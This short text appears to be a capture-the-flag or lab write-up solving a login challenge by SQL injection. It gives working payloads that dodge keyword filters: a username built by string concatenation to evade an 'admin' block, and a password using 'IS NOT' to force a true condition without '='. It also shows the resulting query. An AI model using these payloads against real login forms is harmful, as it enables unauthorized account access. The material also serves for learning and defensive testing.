Firstly, username should be "admin", but admin is filtered.
So we use adm'||'in which can still be admin but won't be filtered.
and the password should be always true, but = is also filtered.
So we use IS NOT expression to bypass this filter.
Username: adm'||'in
Password: a' IS NOT 'b
Complete expression: SELECT username, password FROM users WHERE username='adm'||'in' AND password='a' IS NOT 'b'
